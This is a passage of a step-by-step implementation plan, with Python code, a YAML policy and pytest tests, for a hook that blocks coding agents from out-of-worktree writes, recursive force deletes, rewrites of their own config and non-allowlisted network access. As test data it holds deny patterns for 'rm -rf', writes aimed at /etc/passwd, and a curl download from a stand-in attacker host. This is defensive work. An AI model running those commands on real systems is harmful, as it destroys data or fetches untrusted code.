# Harness Containment `pre_tool` Hook Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give coding harnesses a real `pre_tool` containment layer — deny out-of-worktree writes, destructive deletes, self-config rewrites, and non-allowlisted egress — driven by one versioned policy asset, with denials recorded as structured signals.

**Architecture:** One policy file (`policy/containment.yaml`) is parsed into pure rules. A tiny stdin/stdout hook process (`python -m sdlc.harness.hook`) evaluates each tool call against them. Each `CodingHarness` declares a `containment` capability and compiles the policy into its own CLI's mechanisms — claude gets both `permissions.deny` (un-weakenable floor) and `hooks.PreToolUse` (observable), opencode gets its native deny block, cursor gets nothing and fails closed. Denials come back as `ToolDenial` on `HarnessRunResult`.

**Tech Stack:** Python 3.11+, Pydantic v2, PyYAML, pytest. No new dependencies.

## Global Constraints

- Spec: `docs/superpowers/specs/2026-07-24-harness-containment-pre-tool-hook-design.md`. Read it before Task 1.
- Enums are `(str, Enum)` — **never** `StrEnum`. Matches `models.py:22`.
- Policy asset path is `policy/containment.yaml`. There is **no** `config/` directory; do not create one.
- Path resolution contains **no `__file__` walk** — explicit arg → `$SDLC_CONTAINMENT_POLICY` → repo-root discovery. Mirrors `src/sdlc/agents/loader.py:87-104` and its docstring rationale.
- The CLI is `python -m sdlc.cli`; there is **no `sdlc` console script**. The hook is its own module so it never imports Temporal.
- Containment is **off by default** (`containment_enabled: bool = False`), matching `research_enabled` / `deep_review_enabled` / `memoization_enabled`.
- Denials are **advisory** in this increment — never fail a task. Escalation is E-17.
- Verified against claude **2.1.219**. Hook contract: JSON on stdout, **exit 0**, shape `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"..."}}`.
- Test commands run from the repo root: `python -m pytest tests/<file> -v`.

---

### Task 1: Containment models

**Files:**
- Modify: `src/sdlc/models.py` (add after `SessionDigest`, ~line 102)
- Test: `tests/test_containment_models.py`

**Interfaces:**
- Consumes: nothing
- Produces: `ContainmentLayer`, `ToolDenial`, `ContainmentReport`, `ContainmentConfig`; `HarnessRunResult.denials`, `HarnessRunResult.containment`; `SessionDigest.denials`; `PipelineConfig.containment_enabled`, `PipelineConfig.containment`

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_models.py`:

```python
"""E-15/E-16: containment model contracts."""
from sdlc.models import (
    ContainmentConfig, ContainmentLayer, ContainmentReport,
    HarnessKind, HarnessRunResult, PipelineConfig, SessionDigest, ToolDenial,
)


def test_layer_is_str_enum_with_two_members():
    assert ContainmentLayer.NATIVE == "native"
    assert ContainmentLayer.HOOK == "hook"
    assert len(list(ContainmentLayer)) == 2


def test_tool_denial_round_trips():
    d = ToolDenial(tool="Write", rule_id="no-out-of-worktree-write",
                   layer=ContainmentLayer.HOOK, reason="scoped to worktree",
                   target="/etc/passwd")
    assert ToolDenial.model_validate_json(d.model_dump_json()) == d


def test_containment_report_defaults_to_disabled():
    r = ContainmentReport()
    assert r.enabled is False
    assert r.layers_active == []
    assert r.rules_enforced == []
    assert r.rules_unenforceable == []


def test_harness_run_result_defaults_have_no_denials():
    r = HarnessRunResult(harness=HarnessKind.CLAUDE_CODE, exit_code=0,
                         summary="ok")
    assert r.denials == []
    assert r.containment is None


def test_session_digest_counts_denials():
    assert SessionDigest().denials == 0


def test_pipeline_config_containment_is_off_by_default():
    cfg = PipelineConfig()
    assert cfg.containment_enabled is False
    assert cfg.containment.strict is False
    assert cfg.containment.policy_path is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_models.py -v`
Expected: FAIL with `ImportError: cannot import name 'ContainmentConfig' from 'sdlc.models'`

- [ ] **Step 3: Add the models**

In `src/sdlc/models.py`, immediately after the `SessionDigest` class (which ends at line 102 with `decision_skeleton`), insert:

```python
class ContainmentLayer(str, Enum):
    """Where a containment rule is enforced (E-15/E-16, ADR-17)."""
    NATIVE = "native"   # declarative deny inside the harness CLI's own config
    HOOK = "hook"       # per-call inspection callback


class ToolDenial(BaseModel):
    """One blocked tool call. Small and bounded — travels inline on
    HarnessRunResult, same discipline as SessionDigest."""
    tool: str
    rule_id: str
    layer: ContainmentLayer
    reason: str
    target: str | None = None     # path or command line (scrubbed)


class ContainmentReport(BaseModel):
    """What containment was ACTUALLY in force for a run. Partial coverage
    is recorded rather than refused, so a harness with fewer layers is
    visibly less contained instead of silently so (spec §5)."""
    enabled: bool = False
    layers_active: list[ContainmentLayer] = Field(default_factory=list)
    rules_enforced: list[str] = Field(default_factory=list)
    rules_unenforceable: list[str] = Field(default_factory=list)


class ContainmentConfig(BaseModel):
    """FR-703 containment knobs. `strict` promotes partial layer coverage
    from 'recorded' to 'refuse to start'."""
    policy_path: str | None = None      # None -> $SDLC_CONTAINMENT_POLICY -> discovery
    strict: bool = False
```

In the same file, add two fields to `HarnessRunResult` directly after
`session_digest` (line 214):

```python
    # E-15/E-16: containment outcome. Bounded and inline — the workflow and
    # the E-36 heatmap read these without loading the session artifact.
    denials: list[ToolDenial] = Field(default_factory=list)
    containment: ContainmentReport | None = None
```

Add one field to `SessionDigest`, after `compacted` (line 98):

```python
    denials: int = 0               # E-16: blocked tool calls
```

Add two fields to `PipelineConfig`, directly after `research_enabled`
(line 632):

```python
    containment_enabled: bool = False       # FR-703: off by default; the
                                            # policy is a fence, not a
                                            # sandbox — see ADR-17
    containment: ContainmentConfig = Field(default_factory=ContainmentConfig)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_containment_models.py -v`
Expected: PASS, 6 passed

- [ ] **Step 5: Run the full suite for regressions**

Run: `python -m pytest -q`
Expected: same pass count as before this task, no new failures

- [ ] **Step 6: Commit**

```bash
git add src/sdlc/models.py tests/test_containment_models.py
git commit -m "feat(models): containment layer/denial/report contracts (E-15, ADR-17)"
```

---

### Task 2: Policy schema, loader, and the shipped asset

**Files:**
- Create: `src/sdlc/harness/containment.py`
- Create: `policy/containment.yaml`
- Test: `tests/test_containment_policy.py`

**Interfaces:**
- Consumes: `ContainmentLayer` (Task 1)
- Produces: `Predicate`, `Rule`, `Policy`, `ContainmentError`, `load_policy(path=None) -> Policy`, `POLICY_PATH_ENV = "SDLC_CONTAINMENT_POLICY"`

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_policy.py`:

```python
"""E-15/E-16: policy asset parsing and resolution."""
import pytest

from sdlc.harness.containment import (
    ContainmentError, Predicate, load_policy,
)
from sdlc.models import ContainmentLayer

GOOD = """
version: 1
rules:
  - id: no-out-of-worktree-write
    layer: hook
    tools: [Write, Edit]
    predicate: path_outside_worktree
    reason: "Writes are scoped to the task worktree."
  - id: no-recursive-force-delete
    layer: native
    tools: [Bash]
    predicate: command_matches
    patterns: ["rm -rf *"]
    reason: "Destructive recursive delete."
"""


def _write(tmp_path, text):
    p = tmp_path / "containment.yaml"
    p.write_text(text, encoding="utf-8")
    return str(p)


def test_loads_rules_in_declared_order(tmp_path):
    pol = load_policy(_write(tmp_path, GOOD))
    assert [r.id for r in pol.rules] == [
        "no-out-of-worktree-write", "no-recursive-force-delete"]
    assert pol.rules[0].layer is ContainmentLayer.HOOK
    assert pol.rules[0].predicate is Predicate.PATH_OUTSIDE_WORKTREE
    assert pol.rules[1].patterns == ["rm -rf *"]


def test_rejects_unsupported_version(tmp_path):
    with pytest.raises(ContainmentError, match="version"):
        load_policy(_write(tmp_path, "version: 2\nrules: []\n"))


def test_rejects_unknown_predicate(tmp_path):
    bad = GOOD.replace("path_outside_worktree", "rm_everything")
    with pytest.raises(ContainmentError, match="rm_everything"):
        load_policy(_write(tmp_path, bad))


def test_rejects_duplicate_rule_id(tmp_path):
    dup = GOOD + """
  - id: no-out-of-worktree-write
    layer: hook
    tools: [Write]
    predicate: path_outside_worktree
    reason: "dup"
"""
    with pytest.raises(ContainmentError, match="duplicate"):
        load_policy(_write(tmp_path, dup))


def test_rejects_missing_file_with_actionable_message(tmp_path):
    with pytest.raises(ContainmentError, match="containment policy"):
        load_policy(str(tmp_path / "absent.yaml"))


def test_env_var_resolves_when_no_arg(tmp_path, monkeypatch):
    path = _write(tmp_path, GOOD)
    monkeypatch.setenv("SDLC_CONTAINMENT_POLICY", path)
    assert len(load_policy().rules) == 2


def test_shipped_asset_parses_and_covers_fr703():
    """The repo's own policy must load and cover FR-703's three clauses."""
    pol = load_policy()
    ids = {r.id for r in pol.rules}
    assert "no-out-of-worktree-write" in ids
    assert "no-recursive-force-delete" in ids
    assert "no-agent-config-write" in ids
    assert "egress-allowlist" in ids
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_policy.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'sdlc.harness.containment'`

- [ ] **Step 3: Write the loader**

Create `src/sdlc/harness/containment.py`:

```python
"""Containment policy (E-15/E-16, FR-703, ADR-17).

Pure: parsing and evaluation only. No subprocess, no CLI knowledge, no
Temporal. Everything CLI-specific lives in the adapters, everything
process-specific lives in hook.py — so the whole risk-classing decision is
unit-testable as a table.

Path resolution deliberately contains no __file__ walk, for the same reason
agents/loader.py does not: under `pip install .` the package lives in
site-packages, which has no relationship to where the policy asset lives.
Order: explicit arg -> $SDLC_CONTAINMENT_POLICY -> repo-root discovery.
"""
from __future__ import annotations

import os
from enum import Enum
from pathlib import Path

import yaml
from pydantic import BaseModel, Field

from ..models import ContainmentLayer

POLICY_PATH_ENV = "SDLC_CONTAINMENT_POLICY"

# Two markers, not one: pyproject.toml alone matches any Python project we
# happen to be cwd'd into. Mirrors agents/loader.py:_ROOT_MARKERS.
_ROOT_MARKERS = ("pyproject.toml", "agents/registry.yaml")


class ContainmentError(ValueError):
    """A policy that violates a structural invariant, or cannot be found."""


class Predicate(str, Enum):
    """The complete predicate vocabulary. Adding a fifth is a code change
    plus a schema version bump — deliberately not an expression language."""
    PATH_OUTSIDE_WORKTREE = "path_outside_worktree"
    PATH_MATCHES = "path_matches"
    COMMAND_MATCHES = "command_matches"
    HOST_NOT_ALLOWLISTED = "host_not_allowlisted"


class Rule(BaseModel):
    id: str
    layer: ContainmentLayer      # MINIMUM capability required (spec §4a)
    tools: list[str]
    predicate: Predicate
    reason: str
    patterns: list[str] = Field(default_factory=list)
    allow_hosts: list[str] = Field(default_factory=list)


class Policy(BaseModel):
    version: int
    rules: list[Rule] = Field(default_factory=list)


def _discover_policy_file() -> Path | None:
    """Walk up from cwd for a checkout containing both markers. Dev and
    tests only — production sets $SDLC_CONTAINMENT_POLICY explicitly."""
    for d in (Path.cwd(), *Path.cwd().parents):
        if all((d / m).is_file() for m in _ROOT_MARKERS):
            return d / "policy" / "containment.yaml"
    return None


def _resolve_policy_path(path: str | os.PathLike | None = None) -> Path:
    if path is not None:
        return Path(path)
    env = os.environ.get(POLICY_PATH_ENV)
    if env:
        return Path(env)
    found = _discover_policy_file()
    if found is not None:
        return found
    raise ContainmentError(
        f"cannot locate the containment policy. Tried: an explicit path "
        f"argument; ${POLICY_PATH_ENV}; and walking up from {Path.cwd()} for "
        f"a directory containing both pyproject.toml and agents/registry.yaml.")


def load_policy(path: str | os.PathLike | None = None) -> Policy:
    """Parse and validate the policy asset. Raises ContainmentError on any
    structural problem — callers with containment enabled must fail closed."""
    p = _resolve_policy_path(path)
    if not p.is_file():
        raise ContainmentError(f"containment policy is not a file: {p}")

    raw = yaml.safe_load(p.read_text(encoding="utf-8")) or {}
    version = raw.get("version")
    if version != 1:
        raise ContainmentError(
            f"unsupported containment policy version {version!r} in {p}; "
            f"expected 1")

    rules: list[Rule] = []
    seen: set[str] = set()
    for i, entry in enumerate(raw.get("rules") or []):
        rid = (entry or {}).get("id", f"<rule {i}>")
        if rid in seen:
            raise ContainmentError(f"duplicate rule id {rid!r} in {p}")
        seen.add(rid)
        try:
            rules.append(Rule.model_validate(entry))
        except Exception as e:                    # noqa: BLE001 - re-typed
            raise ContainmentError(
                f"invalid rule {rid!r} in {p}: {e}") from e
    return Policy(version=version, rules=rules)
```

- [ ] **Step 4: Write the shipped policy asset**

Create `policy/containment.yaml`:

```yaml
# Harness containment policy (FR-703, E-15/E-16, ADR-17).
#
# `layer` declares the MINIMUM capability a rule needs, not the only place it
# runs: each adapter enforces every rule at every layer it has (spec §4a).
# On claude that means `layer: native` rules ALSO run through the hook, so the
# denial is observable, while the native deny stays as the floor a buggy hook
# cannot weaken.
#
# This is a fence, not a sandbox. Egress rules are tool-level: a socket opened
# from inside an allowed Bash call is invisible to them. Network-level egress
# is E-21's OS/container tier.
version: 1

rules:
  - id: no-out-of-worktree-write
    layer: hook                 # needs per-call path resolution
    tools: [Write, Edit, NotebookEdit]
    predicate: path_outside_worktree
    reason: "Writes are scoped to the task worktree."

  - id: no-recursive-force-delete
    layer: native
    tools: [Bash]
    predicate: command_matches
    patterns:
      - "rm -rf *"
      - "rm -fr *"
      - "rm -r -f *"
    reason: "Destructive recursive delete."

  - id: no-agent-config-write
    layer: native
    tools: [Write, Edit, NotebookEdit]
    predicate: path_matches
    patterns:
      - "**/.claude/**"
      - "**/.opencode/**"
      - "**/.cursor/**"
      - "**/opencode.json"
    reason: "The agent may not rewrite its own permission config."

  - id: egress-allowlist
    layer: hook
    tools: [WebFetch, WebSearch, Bash]
    predicate: host_not_allowlisted
    allow_hosts:
      - api.anthropic.com
      - github.com
      - pypi.org
      - files.pythonhosted.org
      - registry.npmjs.org
    reason: "Egress is restricted to the model API, git remote, and package registries."
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_policy.py -v`
Expected: PASS, 7 passed

- [ ] **Step 6: Commit**

```bash
git add src/sdlc/harness/containment.py policy/containment.yaml tests/test_containment_policy.py
git commit -m "feat(containment): policy schema, loader, and the FR-703 asset (E-15)"
```

---

### Task 3: Rule evaluation

**Files:**
- Modify: `src/sdlc/harness/containment.py`
- Test: `tests/test_containment_evaluate.py`

**Interfaces:**
- Consumes: `Policy`, `Rule`, `Predicate` (Task 2)
- Produces: `Verdict(allow: bool, rule_id: str | None, reason: str | None)`, `evaluate(policy, tool, tool_input, worktree) -> Verdict`, `target_of(tool, tool_input) -> str | None`

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_evaluate.py`:

```python
"""E-16: the rule matrix. Pure — no subprocess, no CLI."""
import pytest

from sdlc.harness.containment import Policy, Rule, Verdict, evaluate
from sdlc.models import ContainmentLayer

POLICY = Policy(version=1, rules=[
    Rule(id="no-out-of-worktree-write", layer=ContainmentLayer.HOOK,
         tools=["Write", "Edit"], predicate="path_outside_worktree",
         reason="Writes are scoped to the task worktree."),
    Rule(id="no-recursive-force-delete", layer=ContainmentLayer.NATIVE,
         tools=["Bash"], predicate="command_matches",
         patterns=["rm -rf *"], reason="Destructive recursive delete."),
    Rule(id="no-agent-config-write", layer=ContainmentLayer.NATIVE,
         tools=["Write", "Edit"], predicate="path_matches",
         patterns=["**/.claude/**"],
         reason="The agent may not rewrite its own permission config."),
    Rule(id="egress-allowlist", layer=ContainmentLayer.HOOK,
         tools=["WebFetch", "Bash"], predicate="host_not_allowlisted",
         allow_hosts=["github.com"],
         reason="Egress is restricted."),
])


@pytest.fixture
def worktree(tmp_path):
    wt = tmp_path / "runs" / "run1" / "task1"
    wt.mkdir(parents=True)
    return str(wt)


def test_allows_a_write_inside_the_worktree(worktree):
    v = evaluate(POLICY, "Write", {"file_path": f"{worktree}/src/app.py"},
                 worktree)
    assert v == Verdict(allow=True)


def test_denies_a_write_outside_the_worktree(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "/etc/passwd"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-out-of-worktree-write"


def test_denies_a_sibling_worktree_write(worktree, tmp_path):
    """The .N fallback case: <task>.1 must not be reachable from <task>."""
    sibling = tmp_path / "runs" / "run1" / "task1.1" / "x.py"
    v = evaluate(POLICY, "Write", {"file_path": str(sibling)}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-out-of-worktree-write"


def test_denies_a_relative_path_escape(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "../../../etc/hosts"},
                 worktree)
    assert v.allow is False


def test_denies_a_symlink_escape(worktree, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    link = os_symlink_or_skip(tmp_path, worktree, outside)
    v = evaluate(POLICY, "Write", {"file_path": f"{link}/x.py"}, worktree)
    assert v.allow is False


def os_symlink_or_skip(tmp_path, worktree, outside):
    import os
    link = f"{worktree}/escape"
    try:
        os.symlink(str(outside), link, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable (Windows without developer mode)")
    return link


def test_denies_recursive_force_delete(worktree):
    v = evaluate(POLICY, "Bash", {"command": "rm -rf build/"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-recursive-force-delete"


def test_allows_a_benign_command(worktree):
    assert evaluate(POLICY, "Bash", {"command": "pytest -q"},
                    worktree).allow is True


def test_denies_agent_config_write_even_inside_the_worktree(worktree):
    v = evaluate(POLICY, "Write",
                 {"file_path": f"{worktree}/.claude/settings.json"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-agent-config-write"


def test_denies_non_allowlisted_fetch(worktree):
    v = evaluate(POLICY, "WebFetch", {"url": "https://evil.example.com/x"},
                 worktree)
    assert v.allow is False
    assert v.rule_id == "egress-allowlist"


def test_allows_allowlisted_fetch(worktree):
    assert evaluate(POLICY, "WebFetch", {"url": "https://github.com/a/b"},
                    worktree).allow is True


def test_denies_curl_to_non_allowlisted_host(worktree):
    v = evaluate(POLICY, "Bash",
                 {"command": "curl https://evil.example.com/x -o /tmp/y"},
                 worktree)
    assert v.allow is False
    assert v.rule_id == "egress-allowlist"


def test_allows_a_command_with_no_url(worktree):
    assert evaluate(POLICY, "Bash", {"command": "git status"},
                    worktree).allow is True


def test_unknown_tool_is_allowed(worktree):
    """Rules are deny-listed by tool; a tool no rule names is not our concern."""
    assert evaluate(POLICY, "Glob", {"pattern": "**/*"}, worktree).allow is True


def test_first_matching_rule_wins_and_carries_its_reason(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "/etc/passwd"}, worktree)
    assert v.reason == "Writes are scoped to the task worktree."
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_evaluate.py -v`
Expected: FAIL with `ImportError: cannot import name 'Verdict'`

- [ ] **Step 3: Implement evaluation**

Append to `src/sdlc/harness/containment.py`:

```python
import fnmatch
import re
from urllib.parse import urlparse


class Verdict(BaseModel):
    allow: bool
    rule_id: str | None = None
    reason: str | None = None


_URL_RE = re.compile(r"https?://[^\s'\"|;>)]+", re.IGNORECASE)


def target_of(tool: str, tool_input: dict) -> str | None:
    """The single string a denial is 'about' — a path, a command, or a URL."""
    for key in ("file_path", "path", "notebook_path", "command", "url"):
        val = tool_input.get(key)
        if isinstance(val, str) and val:
            return val
    return None


def _abs_under(path: str, worktree: str) -> bool:
    """True when `path` resolves inside `worktree`. resolve() follows
    symlinks, which is what makes an in-worktree symlink to /etc fail."""
    try:
        root = Path(worktree).resolve()
        p = Path(path)
        if not p.is_absolute():
            p = root / p
        p = p.resolve()
    except (OSError, ValueError):
        return False        # unresolvable -> treat as outside (fail closed)
    return p == root or root in p.parents


def _norm_cmd(command: str) -> str:
    return " ".join(command.split())


def _hosts_in(tool: str, tool_input: dict) -> list[str]:
    """Hosts this call reaches, best-effort. For Bash this scans the command
    line for URLs — a socket opened another way is invisible, which is the
    tool-level limitation stated in the spec, not a bug to fix here."""
    hosts: list[str] = []
    url = tool_input.get("url")
    if isinstance(url, str):
        hosts.append(urlparse(url).hostname or "")
    command = tool_input.get("command")
    if isinstance(command, str):
        hosts += [urlparse(m).hostname or "" for m in _URL_RE.findall(command)]
    return [h for h in hosts if h]


def _host_allowed(host: str, allow_hosts: list[str]) -> bool:
    """Exact match or subdomain of an allowlisted host."""
    h = host.lower()
    return any(h == a.lower() or h.endswith("." + a.lower())
               for a in allow_hosts)


def _rule_denies(rule: Rule, tool: str, tool_input: dict,
                 worktree: str) -> bool:
    if tool not in rule.tools:
        return False

    if rule.predicate is Predicate.PATH_OUTSIDE_WORKTREE:
        target = target_of(tool, tool_input)
        return target is not None and not _abs_under(target, worktree)

    if rule.predicate is Predicate.PATH_MATCHES:
        target = target_of(tool, tool_input)
        if target is None:
            return False
        norm = Path(target).as_posix()
        return any(fnmatch.fnmatch(norm, pat) for pat in rule.patterns)

    if rule.predicate is Predicate.COMMAND_MATCHES:
        command = tool_input.get("command")
        if not isinstance(command, str):
            return False
        norm = _norm_cmd(command)
        return any(fnmatch.fnmatch(norm, pat) for pat in rule.patterns)

    if rule.predicate is Predicate.HOST_NOT_ALLOWLISTED:
        hosts = _hosts_in(tool, tool_input)
        return any(not _host_allowed(h, rule.allow_hosts) for h in hosts)

    return False


def evaluate(policy: Policy, tool: str, tool_input: dict,
             worktree: str) -> Verdict:
    """First matching rule wins. `worktree` is a PARAMETER, never computed:
    create_worktree may return <task>.N after a Windows lock fallback and its
    returned path is authoritative (activities.py:260-274)."""
    for rule in policy.rules:
        if _rule_denies(rule, tool, tool_input, worktree):
            return Verdict(allow=False, rule_id=rule.id, reason=rule.reason)
    return Verdict(allow=True)
```

Put `fnmatch`, `re`, and `urlparse` in the module's existing import block
at the top of the file, not mid-file. They are shown here only to make the
snippet self-contained.

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_evaluate.py -v`
Expected: PASS, 14 passed (1 may skip on Windows without symlink privilege)

- [ ] **Step 5: Commit**

```bash
git add src/sdlc/harness/containment.py tests/test_containment_evaluate.py
git commit -m "feat(containment): rule evaluation with four predicates (E-16)"
```

---

### Task 4: The hook process

**Files:**
- Create: `src/sdlc/harness/hook.py`
- Test: `tests/test_containment_hook.py`

**Interfaces:**
- Consumes: `load_policy`, `evaluate`, `target_of` (Tasks 2-3)
- Produces: `decide(payload: dict, policy: Policy, worktree: str) -> dict`, `main(argv: list[str] | None = None) -> int`, module entry `python -m sdlc.harness.hook --worktree <abs> --policy <abs>`, and the rule-id prefix helper `format_reason(rule_id, reason) -> str`

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_hook.py`:

```python
"""E-15: the PreToolUse hook process contract (verified against 2.1.219)."""
import json
import subprocess
import sys

import pytest

from sdlc.harness.containment import Policy, Rule
from sdlc.harness.hook import decide, format_reason, main
from sdlc.models import ContainmentLayer

POLICY = Policy(version=1, rules=[
    Rule(id="no-out-of-worktree-write", layer=ContainmentLayer.HOOK,
         tools=["Write"], predicate="path_outside_worktree",
         reason="Writes are scoped to the task worktree."),
])


def test_allow_emits_an_allow_decision(tmp_path):
    out = decide({"tool_name": "Write",
                  "tool_input": {"file_path": f"{tmp_path}/a.py"}},
                 POLICY, str(tmp_path))
    assert out["hookSpecificOutput"]["permissionDecision"] == "allow"
    assert out["hookSpecificOutput"]["hookEventName"] == "PreToolUse"


def test_deny_carries_the_rule_id_in_the_reason(tmp_path):
    out = decide({"tool_name": "Write",
                  "tool_input": {"file_path": "/etc/passwd"}},
                 POLICY, str(tmp_path))
    hso = out["hookSpecificOutput"]
    assert hso["permissionDecision"] == "deny"
    # permission_denials carries no rule id, so it rides the reason string.
    assert hso["permissionDecisionReason"].startswith(
        "[no-out-of-worktree-write]")


def test_format_reason_round_trips():
    assert format_reason("r-1", "because") == "[r-1] because"


def test_missing_tool_name_allows_rather_than_crashing(tmp_path):
    out = decide({}, POLICY, str(tmp_path))
    assert out["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_main_writes_json_to_stdout_and_exits_zero(tmp_path, capsys,
                                                   monkeypatch):
    pol = tmp_path / "p.yaml"
    pol.write_text(
        "version: 1\nrules:\n"
        "  - id: r\n    layer: hook\n    tools: [Write]\n"
        "    predicate: path_outside_worktree\n    reason: nope\n",
        encoding="utf-8")
    payload = json.dumps({"tool_name": "Write",
                          "tool_input": {"file_path": "/etc/passwd"}})
    monkeypatch.setattr("sys.stdin", __import__("io").StringIO(payload))
    rc = main(["--worktree", str(tmp_path), "--policy", str(pol)])
    assert rc == 0
    out = json.loads(capsys.readouterr().out)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_internal_failure_denies_never_allows(tmp_path, capsys, monkeypatch):
    """A hook that crashes open is worse than no hook at all."""
    monkeypatch.setattr("sys.stdin", __import__("io").StringIO("not json"))
    rc = main(["--worktree", str(tmp_path), "--policy", "/nonexistent.yaml"])
    assert rc == 0                      # exit 0: the JSON carries the verdict
    out = json.loads(capsys.readouterr().out)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_module_is_runnable_as_a_subprocess(tmp_path):
    """claude invokes this as a command; it must work with -m and no cwd
    assumptions, and must not import Temporal."""
    pol = tmp_path / "p.yaml"
    pol.write_text(
        "version: 1\nrules:\n"
        "  - id: r\n    layer: hook\n    tools: [Write]\n"
        "    predicate: path_outside_worktree\n    reason: nope\n",
        encoding="utf-8")
    proc = subprocess.run(
        [sys.executable, "-m", "sdlc.harness.hook",
         "--worktree", str(tmp_path), "--policy", str(pol)],
        input=json.dumps({"tool_name": "Write",
                          "tool_input": {"file_path": "/etc/passwd"}}),
        capture_output=True, text=True, timeout=60)
    assert proc.returncode == 0, proc.stderr
    assert json.loads(proc.stdout)["hookSpecificOutput"][
        "permissionDecision"] == "deny"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_hook.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'sdlc.harness.hook'`

- [ ] **Step 3: Implement the hook**

Create `src/sdlc/harness/hook.py`:

```python
"""PreToolUse hook process (E-15, FR-703).

Invoked by the harness CLI once per tool call, so it is deliberately thin
and import-light: it must NOT import Temporal, pydantic_ai, or sdlc.cli.
All policy logic lives in containment.py, which is pure and testable
without a subprocess.

Contract, verified live against claude 2.1.219: read the hook payload as
JSON on stdin, write one JSON object to stdout, exit 0. The
permissionDecisionReason reaches the model verbatim.
"""
from __future__ import annotations

import argparse
import json
import sys

from .containment import Policy, evaluate, load_policy, target_of

_EVENT = "PreToolUse"


def format_reason(rule_id: str, reason: str) -> str:
    """`result.permission_denials` carries tool_name/tool_use_id/tool_input
    but NO reason or rule id, so the rule id rides the reason string and
    normalise_denials reads it back out."""
    return f"[{rule_id}] {reason}"


def _decision(decision: str, reason: str | None = None) -> dict:
    hso: dict = {"hookEventName": _EVENT, "permissionDecision": decision}
    if reason is not None:
        hso["permissionDecisionReason"] = reason
    return {"hookSpecificOutput": hso}


def decide(payload: dict, policy: Policy, worktree: str) -> dict:
    tool = payload.get("tool_name")
    tool_input = payload.get("tool_input") or {}
    if not isinstance(tool, str) or not isinstance(tool_input, dict):
        return _decision("allow")
    verdict = evaluate(policy, tool, tool_input, worktree)
    if verdict.allow:
        return _decision("allow")
    return _decision(
        "deny", format_reason(verdict.rule_id or "unknown",
                              verdict.reason or "denied by containment policy"))


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="sdlc.harness.hook")
    ap.add_argument("--worktree", required=True)
    ap.add_argument("--policy", default=None)
    args = ap.parse_args(argv)

    try:
        payload = json.loads(sys.stdin.read() or "{}")
        policy = load_policy(args.policy)
        out = decide(payload, policy, args.worktree)
    except Exception as e:                        # noqa: BLE001
        # Fail CLOSED. A hook that crashes open is worse than no hook: the
        # run would look contained while enforcing nothing.
        out = _decision(
            "deny", f"[containment-error] containment hook failed: {e}")

    sys.stdout.write(json.dumps(out))
    sys.stdout.flush()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_hook.py -v`
Expected: PASS, 7 passed

- [ ] **Step 5: Commit**

```bash
git add src/sdlc/harness/hook.py tests/test_containment_hook.py
git commit -m "feat(containment): fail-closed PreToolUse hook process (E-15)"
```

---

### Task 5: Adapter contract and the claude implementation

**Files:**
- Modify: `src/sdlc/harness/adapters.py` (`CodingHarness` ~line 123; `ClaudeCodeHarness` ~line 236)
- Test: `tests/test_containment_adapters.py`

**Interfaces:**
- Consumes: `Policy`, `Rule`, `format_reason` (Tasks 2-4); `ContainmentLayer`, `ToolDenial`, `ContainmentReport` (Task 1)
- Produces: `CodingHarness.containment: frozenset[ContainmentLayer]`, `CodingHarness.apply_containment(policy, req) -> ContainmentReport`, `CodingHarness.normalise_denials(stdout) -> list[ToolDenial]`, and `HarnessRequest.extra_args` / `HarnessRequest.env` mutation as the wiring mechanism

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_adapters.py`:

```python
"""E-15/E-16: adapter-side containment compilation and denial normalisation."""
import json
from pathlib import Path

from sdlc.harness.adapters import (
    ClaudeCodeHarness, HarnessRequest,
)
from sdlc.harness.containment import Policy, Rule
from sdlc.models import ContainmentLayer

POLICY = Policy(version=1, rules=[
    Rule(id="no-out-of-worktree-write", layer=ContainmentLayer.HOOK,
         tools=["Write", "Edit"], predicate="path_outside_worktree",
         reason="Writes are scoped to the task worktree."),
    Rule(id="no-recursive-force-delete", layer=ContainmentLayer.NATIVE,
         tools=["Bash"], predicate="command_matches",
         patterns=["rm -rf *"], reason="Destructive recursive delete."),
])


def test_claude_declares_both_layers():
    assert ClaudeCodeHarness().containment == frozenset(
        {ContainmentLayer.NATIVE, ContainmentLayer.HOOK})


def test_apply_writes_settings_outside_the_worktree(tmp_path):
    wt = tmp_path / "worktree"
    wt.mkdir()
    req = HarnessRequest(prompt="p", cwd=str(wt))
    ClaudeCodeHarness().apply_containment(POLICY, req)

    settings = _settings_path(req)
    assert Path(settings).is_file()
    # The agent may write anywhere inside the worktree, so its own policy
    # file must not live there.
    assert wt not in Path(settings).parents


